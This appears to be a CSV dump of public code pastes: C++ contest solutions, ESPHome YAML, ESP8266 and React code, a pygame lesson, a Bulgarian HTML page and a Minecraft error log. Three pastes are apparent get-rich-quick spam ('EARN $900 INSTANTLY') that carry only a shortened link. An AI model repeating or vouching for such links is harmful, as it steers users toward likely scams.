id,title,username,language,date,content
F4qzBhc4,Untitled,Josif_tepe,C++,Monday 7th of April 2025 01:04:48 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
#include <map>
#include <fstream>
#include <cstring>
using namespace std;
typedef long long ll;
const int maxn = 1e6 + 10;
 
int dist(int si, int sj, int ei, int ej) {
    return abs(si - ei) + abs(sj - ej);
}
pair<int, int> idx[maxn];
//vector<pair<int, int>> graph[maxn];
int pref_sum[maxn];
int cords[maxn];
int mat[10001][10001];
bool visited[maxn];
int main() {
//    ifstream cin(""in.txt"");
    ios_base::sync_with_stdio(false);
    cin.tie(0);
    
    memset(visited, false, sizeof visited);
    int r, c;
    cin >> r >> c;
    ll res = 0;
    int cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            cin >> mat[i][j];
            idx[cnt] = {i, j};
            cnt++;
        }
    }
    cnt = 1;
       for(int i = 0; i < r; i++) {
           for(int j = 0; j < c; j++) {
               if(cnt != mat[i][j]) {
                   
                   pair<int, int> c = make_pair(i, j);
                   if(!visited[cnt]) {
                       bool ok = false;
//                       cout << cnt << endl;
                       int sum = 0;
                       while(!ok) {
                           if(mat[c.first][c.second] == cnt) {
                               ok = true;
                           }
                           if(visited[mat[c.first][c.second]]) {
                               break;
                           }
                           visited[mat[c.first][c.second]] = true;
                           sum += dist(c.first, c.second, idx[mat[c.first][c.second]].first, idx[mat[c.first][c.second]].second);
                           pref_sum[mat[c.first][c.second]] = sum;
                           cords[mat[c.first][c.second]] = cnt;
                           c = idx[mat[c.first][c.second]];
                           if(ok) {
                               break;
                           }
                           
                       }
//                       cout << cnt << "" "" << sum << endl;
                       pref_sum[cnt] = sum;
                       visited[cnt] = true;
                       
                   }
               }
               cnt++;
           }
       }
   
    cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            int a = mat[i][j];
            int b = cnt;
            if(a != b) {
                 
                 if(cords[a] == b) {
                    res += pref_sum[b] - pref_sum[a];
                }
                else {
                    res += pref_sum[cords[a]] - pref_sum[a] + pref_sum[b];
//                    cout << cords[a] << "" "" << pref_sum[cords[a]] << "" "" << pref_sum[a] << "" "" << pref_sum[b] << endl;
//                    cout << b << "" "" << a << "" "" << pref_sum[cords[a]] - pref_sum[a] + pref_sum[b] << endl;
                }
//                break;
            }
            cnt++;
        }
    }
    cout << res << endl;
    return 0;
     
}
"
gh4w6AT1,钉板上的正方形 参考代码,Dmaxiya,C++,Monday 7th of April 2025 12:57:41 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 200000 + 100;
struct Vector {
    int x, y;
    Vector() : x(0), y(0) {}
    Vector(int x, int y) : x(x), y(y) {}
};

Vector operator+(const Vector &a, const Vector &b) {
    return Vector(a.x + b.x, a.y + b.y);
}

int operator*(const Vector &a, const Vector &b) {
    return a.x * b.x + a.y * b.y;
}

Vector rotate90(const Vector &v) {
    return Vector(Vector(0, -1) * v, Vector(1, 0) * v);
}

int n = 10;
set<int> st;
string G[10] = {
    ""1101011111"",
    ""1110011110"",
    ""1100101111"",
    ""1011011110"",
    ""1010111100"",
    ""1001010101"",
    ""1111111110"",
    ""0111111110"",
    ""0110101111"",
    ""1010010100""
};

bool judge(const Vector &p) {
    return p.x >= 0 && p.x < n && p.y >= 0 && p.y < n && G[p.x][p.y] == '1';
}

bool judge(int x1, int y1, int x2, int y2) {
    Vector v(x2 - x1, y2 - y1);
    v = rotate90(v);
    Vector p = Vector(x2, y2) + v;
    if (!judge(p)) {
        return false;
    }
    v = rotate90(v);
    p = p + v;
    return judge(p);
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < n; ++j) {
            if (G[i][j] != '1') {
                continue;
            }
            for (int k = 0; k < n; ++k) {
                for (int l = 0; l < n; ++l) {
                    if (G[k][l] != '1') {
                        continue;
                    }
                    if (judge(i, j, k, l)) {
                        Vector v(k - i, l - j);
                        st.insert(v * v);
                    }
                }
            }
        }
    }
    st.erase(0);
    cout << st.size() << endl;

    return 0;
}
"
AkarRkiX,EARN $900 INSTANTLY 2025 X0,KENA05,JavaScript,Monday 7th of April 2025 12:51:38 PM CDT," 
Pdf https://goo.su/DgLIPOe


1bBSEQHZ6J
"
PtuFiBEV,Untitled,arushear,YAML,Monday 7th of April 2025 12:51:03 PM CDT,"binary_sensor:
  - platform: gpio
    pin:
      number: GPIOXX
      mode: INPUT_PULLUP
      inverted: true
    name: ""Przycisk""
    on_press:
      - binary_sensor.template.publish:
          id: btn_short
          state: ON
      - delay: 50ms
      - binary_sensor.template.publish:
          id: btn_short
          state: OFF
    on_double_click:
      - binary_sensor.template.publish:
          id: btn_double
          state: ON
      - delay: 50ms
      - binary_sensor.template.publish:
          id: btn_double
          state: OFF
    on_long_press:
      - binary_sensor.template.publish:
          id: btn_long
          state: ON
      - delay: 50ms
      - binary_sensor.template.publish:
          id: btn_long
          state: OFF

binary_sensor:
  - platform: template
    id: btn_short
    name: ""Przycisk Short""
    device_class: moving
  - platform: template
    id: btn_double
    name: ""Przycisk Double""
    device_class: moving
  - platform: template
    id: btn_long
    name: ""Przycisk Long""
    device_class: moving
"
qE7Hk5Md,gemlog,crackit-id,JavaScript,Monday 7th of April 2025 12:43:05 PM CDT,"fetch('https://crackitindonesia.net/members/api/auth/ver2/login/', {
  ////this second argument containing method and body determines that this request is a POST request and what information will be sent to the API. 
  method: 'POST',  
  body: JSON.stringify({id: '200'})
}).then(response => {
  if (response.ok){
    return response.json();
  }
  throw new Error('Request failed!');
}, networkError => {
  console.log(networkError.message); 
}).then(jsonResponse => {
  return jsonResponse
}); "
fpHag9Ss,Make $1000 15-MINUTES (BEGINNER) 3R,KENA05,JavaScript,Monday 7th of April 2025 12:35:44 PM CDT," 
Pdf https://goo.su/DgLIPOe


2haaYNMJUC
"
WRA0Rrif,Untitled,RumenDulgerov,HTML,Monday 7th of April 2025 12:34:36 PM CDT,"<!DOCTYPE html>
<html lang=""bg"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>ДЗИ</title>

        <style>
            body{
                width: 900px;
                background-color: #BFBFBF;
                text-align: center;
                font-family: ""Arial Narrow"", ""sans-serif"" ;
            }
            #blok1{
                padding: 10px;
                height: 300px;
                display: flex;
            }
            #blok2{
                width: 45%;
                justify-content: center;
            }
            #blok3{
                width: 45%;
                justify-content: center;
            }
            #blok4{
                padding: 10px;
                background-color: #f2f2f2;
            }
            #blok5{
                padding: 10px;
                height: 300px;
                display: flex;
            }
            #blok6{
                width: 45%;
                justify-content: center;
            }
            #blok7{
                width: 45%;
                justify-content: center;
            }
            .snimki{
                width: 45%;
                border-radius: 100%;
                border-color: #fff ;
                border: solid;
                border-width: 5px;
        
            }
        </style>
</head>
<body>
    <div id=""blok1"" class=""mainBlok"">
        <div id=""blok2"" class=""podBlok"">
            <img src=""img_1.jpg"" class=""snimki"">
            <h3>БЪЛГАРСКИ ЕЗИК И ЛИТЕРАТУРА</h3>
        </div>
        <div id=""blok3"" class=""podBlok"">
            <img src=""Img_2.jpg"" class=""snimki"">
            <h3>БИОЛОГИЯ</h3>
        </div>
    </div>
    <div id=""blok4"" class=""mainBlok"">
        <h1>ПОДГОТВИ СЕ ЗА МАТУРИТЕ УСПЕШНО!</h1>
    </div>
    <div id=""blok5"" class=""mainBlok"">
        <div id=""blok6"" class=""podBlok"" >
            <img src=""Img_3.jpg""class=""snimki"">
            <h3>ИНФОРМАТИКА</h3>
        </div>
        <div id=""blok7"" class=""podBlok"">
            <img src=""img_4.jpg""class=""snimki"">
            <h3>ИНФОРМАЦИОННИ ТЕХНОЛОГИИ</h3>
        </div>
    </div>
</body>
</html>"
BZp3jBga,EARN $900 INSTANTLY 2025 Z1,KENA05,JavaScript,Monday 7th of April 2025 12:19:48 PM CDT," 
Pdf https://goo.su/DgLIPOe


I0H2AWUn4l
"
FbZPGx4g,Untitled,Mattykurlzz,C++,Monday 7th of April 2025 12:13:58 PM CDT," // ======================================================
// Webserver program that sends button information
// to ESP8266 and puts a control led on the page
// ======================================================

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

ESP8266WebServer server(80);

// Your routers credentials
const char* ssid = ""Mi PhoneR"";
const char* password = ""12345678"";

// ==========================================
// initial variables
// ========================================== 

String buttonON;
String buttonOFF;

int sumDelay = 0;

#define pinForward D6
#define pinBackward D7

#define maxDelay  10000
#define step      1000

void calibrate();


// =========================================
// Here is the HTML page
// =========================================
String getPage()
  {
  String page = ""<!DOCTYPE HTML>"";
  page += ""<html>"";
  page += ""<head>"";
  page += ""<meta name = \""viewport\"" content = \""width = device-width, initial-scale = 1.0 maximum-scale = 2.5, user-scalable=1\"">"";
  page += ""<title>Luc's button demo</title>"";
  page += ""<body style='background-color:powderblue;'>""; 
  page += ""</head>"";
  page += ""<body>"";
  
  page += ""<h1 style='color:red'>Luc's web-button for ESP8266</h1>"";
  page += ""<br>"";
  page += ""<br>"";

  page += ""<FORM action=\""/\"" method=\""post\"">"";
  page += ""<button type=\""submit\"" name=\""button1ON\"" id=\""button1ON\"" value=\""but1ON\"">Open</button>"";
  page += ""</form>"";

  page += ""<FORM action=\""/\"" method=\""post\"">"";
  page += ""<button type=\""submit\"" name=\""button1OFF\"" id=\""button1OFF\"" value=\""but1OFF\"">Close</button>"";
  page += ""</form>"";

  page += ""<FORM action=\""/\"" method=\""post\"">"";
  page += ""<button type=\""submit\"" name=\""button3\"" id=\""button3\"" value=\""but3\"">Open full</button>"";
  page += ""</form>"";

  page += ""<FORM action=\""/\"" method=\""post\"">"";
  page += ""<button type=\""submit\"" name=\""button4\"" id=\""button4\"" value=\""but4\"">Close full</button>"";
  page += ""</form>"";

  page += ""<br>"";
  page += ""<br>"";

  return page;
  }


// ==================================================
// Handle for page not found
// ==================================================
void handleNotFound()
{
  server.send(200, ""text/html"", getPage());
}


// ==================================================
// Handle submit form
// ==================================================
void handleSubmit()
{
  //Text to show
   
   if (server.hasArg(""button1ON""))
      {
      buttonON = server.arg(""button1ON"");
      digitalWrite(pinForward, HIGH);
      int wait = sumDelay <= (maxDelay - step) ? step : (maxDelay - sumDelay);
      delay(wait);
      sumDelay += wait;
      digitalWrite(pinForward, LOW);
      } 

   if (server.hasArg(""button1OFF""))
      {
      buttonOFF = server.arg(""button1OFF"");
      digitalWrite(pinBackward, HIGH);
      int wait = sumDelay > step ? step : sumDelay;
      delay(wait);
      sumDelay -= wait;
      digitalWrite(pinBackward, LOW);
      }  

  if (server.hasArg(""button4""))
      {
      buttonOFF = server.arg(""button4"");
      calibrate();
      sumDelay = 0;
      }  

  if (server.hasArg(""button3""))
      {
      buttonOFF = server.arg(""button3"");
      digitalWrite(pinBackward, HIGH);
      int wait = maxDelay - sumDelay;
      delay(wait);
      sumDelay -= wait;
      digitalWrite(pinBackward, LOW);
      }      
     
  server.send(200, ""text/html"", getPage());       //Response to the HTTP request

}  


// ===================================================
// Handle root
// ===================================================
void handleRoot() 
{   
  if (server.args() ) 
    {
    handleSubmit();
    } 
  else 
    {
    server.send(200, ""text/html"", getPage());  
    }
}

void calibrate() {
  while(digitalRead(D3)) {
    digitalWrite(pinForward, HIGH);
    delay(10);
  }
    digitalWrite(pinForward, LOW);
}


// ===================================================
// Setup
// ===================================================
void setup()
{
  pinMode(D6, OUTPUT);
  pinMode(D7, OUTPUT);
  digitalWrite(D6, LOW);
  digitalWrite(D7, LOW);

  delay(1000);
  Serial.begin(9600);

  pinMode(D3, INPUT_PULLUP);

  // Connect to Wi-Fi network with SSID and password
  Serial.print(""Connecting to "");
  Serial.println(ssid);
  Serial.print(WiFi.begin(ssid,password));
  while (WiFi.status() != WL_CONNECTED) 
  {
    delay(500);
    Serial.print(""."");
    Serial.print(WiFi.status());
  }
  // Print local IP address and start web server
  Serial.println("""");
  Serial.println(""WiFi connected."");
  Serial.println(""IP address: "");
  Serial.println(WiFi.localIP());
  server.begin();
  server.on(""/"", handleRoot);
  server.onNotFound(handleNotFound);

  server.begin();
  delay(500);
  calibrate();
}


// ===================================================
// Loop
// ===================================================
void loop()
{  
  server.handleClient(); 
  delay(50);
}
"
cAaY0hNa,Untitled,levshx,Bash,Monday 7th of April 2025 11:34:19 AM CDT,"[19:29:34] [NEI-worker-thread-7/ERROR] [NotEnoughItems/]: Error while looking up usage recipe
[19:29:34] [NEI-worker-thread-7/ERROR] [NotEnoughItems/]: inputId: item
[19:29:34] [NEI-worker-thread-7/ERROR] [NotEnoughItems/]: ingredients: [16xitem.crabClaw@0]
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: java.lang.ClassCastException: null not an ItemStack, ItemStack[] or List<ItemStack?
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.NEIServerUtils.extractRecipeItems(NEIServerUtils.java:376)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.PositionedStack.<init>(PositionedStack.java:32)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.PositionedStack.<init>(PositionedStack.java:44)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.ShapedRecipeHandler$CachedShapedRecipe.<init>(ShapedRecipeHandler.java:34)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.ShapedRecipeHandler$CachedShapedRecipe.<init>(ShapedRecipeHandler.java:40)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.ShapedRecipeHandler.loadUsageRecipes(ShapedRecipeHandler.java:122)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.TemplateRecipeHandler.loadUsageRecipes(TemplateRecipeHandler.java:440)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.TemplateRecipeHandler.getUsageHandler(TemplateRecipeHandler.java:567)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.TemplateRecipeHandler.getUsageAndCatalystHandler(TemplateRecipeHandler.java:591)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.GuiUsageRecipe.getUsageOrCatalystHandler(GuiUsageRecipe.java:96)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.GuiUsageRecipe.lambda$getUsageHandlers$0(GuiUsageRecipe.java:52)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at Launch//codechicken.nei.recipe.RecipeHandlerQuery.lambda$getHandlersWithRecipes$3(RecipeHandlerQuery.java:98)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.ReferencePipeline$3$1.accept(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.AbstractPipeline.copyInto(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.ReduceOps$ReduceTask.doLeaf(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.ReduceOps$ReduceTask.doLeaf(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.stream.AbstractTask.compute(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.CountedCompleter.exec(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.ForkJoinTask.doExec(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.ForkJoinPool$WorkQueue.topLevelExec(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.ForkJoinPool.scan(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.ForkJoinPool.runWorker(Unknown Source)
[19:29:34] [NEI-worker-thread-7/INFO] [STDERR/]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.base/java.util.concurrent.ForkJoinWorkerThread.run(Unknown Source)"
ftRuhwMp,GenerateTest.tsx,windrunner,JavaScript,Monday 7th of April 2025 11:29:49 AM CDT,"import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import axios from 'axios';
import { Header } from './Header';
import { Footer } from './Footer';
import { Button } from ""@/components/ui/button"";
import { Loader2, TestTube, BadgeCheck, BookOpen, Download } from ""lucide-react"";
import { cn } from ""@/lib/utils"";
import { useTheme } from ""@/hooks/useTheme"";
import { useScrollAnimation } from ""@/hooks/useScrollAnimation"";
import '../styles/GenerateTest.css';
import '../styles/MockTest.css';
import { BlockMath, InlineMath } from ""react-katex"";
import ""katex/dist/katex.min.css"";

// Subject background images and colors
const subjectThemes: Record<string, { bgImage: string, primaryColor: string, icon: React.ElementType }> = {
  biology: { 
    bgImage: ""https://images.unsplash.com/photo-1530026405186-ed1f139313f8"", 
    primaryColor: ""rgba(16, 185, 129, 0.8)"", // green
    icon: TestTube
  },
  chemistry: {
    bgImage: ""https://images.unsplash.com/photo-1603126857599-f6e157fa2fe6"",
    primaryColor: ""rgba(124, 58, 237, 0.8)"", // purple
    icon: TestTube
  },
  physics: {
    bgImage: ""https://images.unsplash.com/photo-1636466497217-26a8cbeaf0aa"",
    primaryColor: ""rgba(59, 130, 246, 0.8)"", // blue
    icon: TestTube
  },
  mathematics: {
    bgImage: ""https://images.unsplash.com/photo-1635372722656-389f87a941db"",
    primaryColor: ""rgba(239, 68, 68, 0.8)"", // red
    icon: TestTube
  },
  default: {
    bgImage: ""https://images.unsplash.com/photo-1488190211105-8b0e65b80b4e"",
    primaryColor: ""rgba(79, 70, 229, 0.8)"", // indigo
    icon: TestTube
  }
};

const GenerateTest = () => {
  const { subject = """" } = useParams();
  const [loading, setLoading] = useState(false);
  const [testResult, setTestResult] = useState('');
  const { isDarkMode } = useTheme();
  
  // Animation refs
  const fadeInRef = useScrollAnimation({ animation: 'fade' });
  const slideUpRef = useScrollAnimation({ animation: 'slide', direction: 'up', delay: 3 });
  
  // Format subject for display (capitalize first letter)
  const formattedSubject = subject
    .replace(/_/g, "" "")
    .split("" "")
    .map(word => word.charAt(0).toUpperCase() + word.slice(1))
    .join("" "");
  
  const subjectKey = subject.toLowerCase().replace(/_/g, """");
  const { bgImage, primaryColor, icon: SubjectIcon } = subjectThemes[subjectKey] || subjectThemes.default;

  const generateTest = async () => {
    setLoading(true);
    setTestResult('');
    
    try {
      const res = await axios.post(""http://127.0.0.1:8001/api/generate"", {
        subject: subject.toLowerCase(),
      });
      setTestResult(res.data.mock_test);
    } catch (error: any) {
      console.error(""Error generating test:"", error.response?.data || error);
      alert(""An error occurred while generating the test."");
    } finally {
      setLoading(false);
    }
  };

  const handlePrint = () => {
    window.print();
  };

  const formatResponse = (text: string): JSX.Element[] | null => {
    if (!text) return null;

    const formattedElements: JSX.Element[] = [];
    let currentOptions: JSX.Element[] = [];
    let questionCount = 0;
    let insideSection = false;

    text.split(""\n"").forEach((line, index) => {
      if (line.startsWith(""###"")) {
        questionCount = 0;
        insideSection = true;
        formattedElements.push(
          <h3 key={index} className=""formatted-subheading"">
            {line.replace(""###"", """").trim()}
          </h3>
        );
      } else if (line.match(/^\d+\./)) {
        if (insideSection) {
          questionCount++;
          const questionText = line.replace(/^\d+\.\s*/, """").trim();
          const containsMath = questionText.includes(""$"") || questionText.includes(""\\("");

          formattedElements.push(
            <div key={index} className=""mcq-container"">
              <p className=""mcq-question"">
                {`${questionCount}. `}
                {containsMath ? <BlockMath>{questionText}</BlockMath> : questionText}
              </p>
            </div>
          );
        } else {
          formattedElements.push(
            <p key={index} className=""formatted-text"">
              {line}
            </p>
          );
        }
      } else if (line.match(/^[a-d]\)/i)) {
        const optionText = line.replace(/^[a-d]\)\s*/, """").trim();
        const containsMath = optionText.includes(""$"") || optionText.includes(""\\("");

        currentOptions.push(
          <span key={index} className=""mcq-option"">
            {containsMath ? <InlineMath>{optionText}</InlineMath> : optionText}
          </span>
        );
      } else {
        const containsMath = line.includes(""$"") || line.includes(""\\("");

        formattedElements.push(
          <p key={index} className=""formatted-text"">
            {containsMath ? <InlineMath>{line}</InlineMath> : line}
          </p>
        );
      }
    });

    if (currentOptions.length > 0) {
      formattedElements.push(
        <div key=""final-options"" className=""mcq-options"">{currentOptions}</div>
      );
    }

    return formattedElements;
  };

  return (
    <div className={cn(
      ""min-h-screen"",
      isDarkMode 
        ? ""bg-gradient-to-b from-gray-900 via-gray-800 to-gray-900"" 
        : ""bg-gradient-to-b from-blue-50 via-indigo-50/30 to-white""
    )}>
      <Header />
      
      {/* Particles background */}
      <div id=""particles-js"" className=""fixed inset-0 pointer-events-none""></div>
      
      <div className=""pt-28 pb-20 px-4 container max-w-4xl mx-auto relative"">
        {/* Hero section with background image */}
        <div className=""text-center mb-10"" ref={fadeInRef}>
          <div className=""inline-block p-2 rounded-full bg-primary/10 mb-4 animate-bounce"">
            <SubjectIcon className=""h-6 w-6 text-primary"" />
          </div>
          
          <h1 className={cn(
            ""text-3xl md:text-5xl font-bold mb-4"",
            ""animate-fade-in""
          )}>
            Generate {formattedSubject} Mock Test
          </h1>
          
          <p className=""text-muted-foreground text-lg max-w-2xl mx-auto mb-8 animate-fade-in stagger-1"">
            Create customized mock tests with detailed solutions to test your knowledge and prepare for exams.
          </p>
          
          <div className=""flex items-center justify-center gap-4 mb-12 animate-fade-in stagger-2"">
            <Button 
              size=""lg""
              onClick={generateTest}
              className=""gap-2 px-8 py-6 h-auto rounded-full font-semibold text-lg shadow-lg hover:shadow-xl hover:scale-105 transition-all""
              style={{ 
                background: primaryColor,
                borderColor: 'transparent'
              }}
              disabled={loading}
            >
              {loading ? (
                <>
                  <Loader2 className=""h-5 w-5 animate-spin"" />
                  Generating Test...
                </>
              ) : (
                <>
                  <TestTube className=""h-5 w-5"" />
                  Create {formattedSubject} Test
                </>
              )}
            </Button>
          </div>
          
          <div className=""grid grid-cols-1 md:grid-cols-3 gap-6 max-w-3xl mx-auto animate-fade-in stagger-3"">
            <div className={cn(
              ""rounded-xl p-5 flex flex-col items-center text-center hover:scale-105 transition-all"",
              isDarkMode ? ""bg-gray-800/50"" : ""bg-white/80 shadow-sm"",
              ""border border-primary/10""
            )}>
              <BookOpen className=""h-10 w-10 text-primary mb-3"" />
              <h3 className=""font-semibold text-lg mb-1"">Curriculum-Aligned</h3>
              <p className=""text-muted-foreground text-sm"">Tests based on the official syllabus and exam patterns</p>
            </div>
            
            <div className={cn(
              ""rounded-xl p-5 flex flex-col items-center text-center hover:scale-105 transition-all"",
              isDarkMode ? ""bg-gray-800/50"" : ""bg-white/80 shadow-sm"",
              ""border border-primary/10""
            )}>
              <BadgeCheck className=""h-10 w-10 text-primary mb-3"" />
              <h3 className=""font-semibold text-lg mb-1"">Detailed Solutions</h3>
              <p className=""text-muted-foreground text-sm"">Step-by-step explanations for every question</p>
            </div>
            
            <div className={cn(
              ""rounded-xl p-5 flex flex-col items-center text-center hover:scale-105 transition-all"",
              isDarkMode ? ""bg-gray-800/50"" : ""bg-white/80 shadow-sm"",
              ""border border-primary/10""
            )}>
              <Download className=""h-10 w-10 text-primary mb-3"" />
              <h3 className=""font-semibold text-lg mb-1"">Downloadable PDF</h3>
              <p className=""text-muted-foreground text-sm"">Save tests for offline practice and reference</p>
            </div>
          </div>
        </div>

        {/* Test Result */}
        {loading && (
          <div className=""flex flex-col items-center justify-center p-10 text-center"">
            <div className=""w-16 h-16 border-4 border-primary/30 border-t-primary rounded-full animate-spin mb-4""></div>
            <p className=""text-lg font-medium"">Generating your test...</p>
            <p className=""text-muted-foreground"">This may take a few moments</p>
          </div>
        )}
        
        {testResult && (
          <div 
            className={cn(
              ""rounded-2xl p-6 md:p-8 animate-fade-in"",
              isDarkMode ? ""bg-gray-800/70"" : ""bg-white/90 shadow-lg"",
              ""border border-primary/10""
            )}
            ref={slideUpRef}
          >
            <div className=""mb-6 flex justify-between items-center"">
              <h2 className=""text-2xl font-bold"">{formattedSubject} Mock Test</h2>
              <Button variant=""outline"" className=""rounded-full gap-2"" onClick={handlePrint}>
                <Download className=""h-4 w-4"" />
                Download PDF
              </Button>
            </div>
            
            <div className=""test-result"">
              <div className=""formatted-output"">{formatResponse(testResult)}</div>
            </div>
            
            <div className=""mt-8 flex flex-col sm:flex-row gap-4 justify-center"">
              <Button 
                onClick={generateTest}
                className=""gap-2""
                variant=""outline""
              >
                <TestTube className=""h-4 w-4"" />
                Generate Another Test
              </Button>
              
              <Button className=""gap-2"">
                View Solutions
              </Button>
            </div>
          </div>
        )}
      </div>
      
      <Footer />
    </div>
  );
};

export default GenerateTest;"
p7256gGR,Lesson 6 - Coins,MCreeper12731,Python,Monday 7th of April 2025 11:19:47 AM CDT,"import pygame
pygame.init()

width = 1200
height = 600
window = pygame.display.set_mode((width, height))
pygame.display.set_caption(""Platformer Game"")

# Spremenljivke, ki jih bomo potrebovali za igralca
# ---

class Player:
    def __init__(self, x, y):
        self.size = 75
        self.position = pygame.Rect(x, y, self.size, self.size)
        self.image = pygame.image.load(""images/scratch-cat.png"")
        self.image = pygame.transform.scale(self.image, (self.size, self.size))
        self.speed_x = 0
        self.speed_y = 0
        self.on_ground = False
        self.score = 0
        self.direction = 0
    
    def move(self):
        keys = pygame.key.get_pressed()
        if keys[pygame.K_d]:
            self.speed_x = 5
            self.direction = 1
        elif keys[pygame.K_a]:
            self.speed_x = -5
            self.direction = -1
        else:
            self.speed_x = 0

        if keys[pygame.K_SPACE] and self.on_ground == True:
            self.on_ground = False
            self.speed_y = -18

        if self.speed_y < 20:
            self.speed_y += 1

        self.position.x += self.speed_x
        self.position.y += self.speed_y

        if self.position.x < 0:
            self.position.x = 0
        if self.position.x > width - self.size:
            self.position.x = width - self.size
        if self.position.y < 0:
            self.position.y = 0
        if self.position.y > height - self.size:
            self.position.y = height - self.size
        
        for platform in platforms:
            if self.position.colliderect(platform):
                resolve_collision(self.position, platform)

        

player = Player(100, 100)
player2 = Player(300, 300)

platforms = [pygame.Rect(0, height - 50, width, 50), pygame.Rect(300, 500, 200, 20), pygame.Rect(600, 350, 200, 20), pygame.Rect(900, 400, 200, 20)]

# ---

def resolve_collision(rect_a, rect_b):
    # Compute overlap distances in x and y
    dx1 = rect_b.right - rect_a.left
    dx2 = rect_a.right - rect_b.left
    dy1 = rect_b.bottom - rect_a.top
    dy2 = rect_a.bottom - rect_b.top

    # Find the smallest displacement to separate them
    min_dx = min(dx1, dx2)
    min_dy = min(dy1, dy2)

    if min_dx < min_dy:
        # Move rect_a left or right
        if dx1 < dx2:
            rect_a.x += dx1  # Move right
        else:
            rect_a.x -= dx2  # Move left
    else:
        # Move rect_a up or down
        if dy1 < dy2:
            player.speed_y = 0
            rect_a.y += dy1  # Move down
        else:
            player.on_ground = True
            player.speed_y = 0
            rect_a.y -= dy2  # Move up
    
    return True  # Collision was resolved

# Glavna zanka igre
clock = pygame.time.Clock()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    window.fill((255, 255, 255))
    # background_image = pygame.image.load(""images/New Piskel.png"")
    # background_image = pygame.transform.scale(background_image, (width, height))
    # window.blit(background_image, (0, 0))
    # Premikanje igralčevega lika
    # ---

    # Vsako ponovitev zanke (vsak frame) dobimo pritisnjene tipke
    # in se glede na njih odločimo, kako bomo igralca premaknili

    player.move()


    # ---
    # Izris likov
    # ---

    if (player.direction < 0):
        window.blit(pygame.transform.flip(player.image, True, False), player.position)
    else:
        window.blit(player.image, player.position)
    for platform in platforms:
        pygame.draw.rect(window, (0, 127, 0), platform)


    # ---

    pygame.display.update()
    clock.tick(60)

